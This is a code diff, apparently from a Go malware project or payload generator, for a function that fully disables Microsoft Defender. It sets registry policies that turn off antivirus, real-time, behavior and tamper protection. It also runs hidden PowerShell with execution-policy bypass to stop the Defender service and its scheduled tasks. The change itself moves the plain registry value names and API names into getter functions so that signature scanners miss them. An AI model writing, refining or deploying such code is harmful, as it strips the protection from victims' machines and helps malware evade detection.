@@ -11,7 +11,7 @@ func disableDefenderFull() {
 
 	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
 	regOpenKeyEx := advapi32.NewProc(getRegOpenKeyExWName())
-	regSetValueEx := advapi32.NewProc("RegSetValueExW")
+	regSetValueEx := advapi32.NewProc(getRegSetValueExWName())
 	regCloseKey := advapi32.NewProc(getRegCloseKeyName())
 	regCreateKeyEx := advapi32.NewProc(getRegCreateKeyExWName())
 
@@ -44,18 +44,23 @@ func disableDefenderFull() {
 	rtpPolicies := getDefenderRtpPath()
 	spynetPolicies := getDefenderSpynetPath()
 
-	setDword(0x80000002, defenderPolicies, "DisableAntiSpyware", 1)
-	setDword(0x80000002, defenderPolicies, "DisableAntiVirus", 1)
-	setDword(0x80000002, defenderPolicies, "ServiceKeepAlive", 0)
+	dv := getDefenderValues()
+	if len(dv) >= 11 {
+		setDword(0x80000002, defenderPolicies, dv[0], 1)
+		setDword(0x80000002, defenderPolicies, dv[1], 1)
+		setDword(0x80000002, defenderPolicies, dv[2], 0)
 
-	setDword(0x80000002, rtpPolicies, "DisableRealtimeMonitoring", 1)
-	setDword(0x80000002, rtpPolicies, "DisableBehaviorMonitoring", 1)
-	setDword(0x80000002, rtpPolicies, "DisableIOAVProtection", 1)
-	setDword(0x80000002, rtpPolicies, "DisableOnAccessProtection", 1)
-	setDword(0x80000002, rtpPolicies, "DisableScanOnRealtimeEnable", 1)
+		setDword(0x80000002, rtpPolicies, dv[3], 1)
+		setDword(0x80000002, rtpPolicies, dv[4], 1)
+		setDword(0x80000002, rtpPolicies, dv[5], 1)
+		setDword(0x80000002, rtpPolicies, dv[6], 1)
+		setDword(0x80000002, rtpPolicies, dv[7], 1)
 
-	setDword(0x80000002, spynetPolicies, "SpynetReporting", 0)
-	setDword(0x80000002, spynetPolicies, "SubmitSamplesConsent", 2)
+		setDword(0x80000002, spynetPolicies, dv[8], 0)
+		setDword(0x80000002, spynetPolicies, dv[9], 2)
+
+		setDword(0x80000002, getTamperProtectionPath(), dv[10], 0)
+	}
 
 	stopCmd := cmdHidden(getPowerShellExeName(), "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
 		"-Command", getStopDefenderServiceCmd())
@@ -64,8 +69,6 @@ func disableDefenderFull() {
 	disableTaskCmd := cmdHidden(getPowerShellExeName(), "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
 		"-Command", getDisableDefenderTasksCmd())
 	_ = disableTaskCmd.Run()
-
-	setDword(0x80000002, getTamperProtectionPath(), "TamperProtection", 0)
 }
 `)
 }
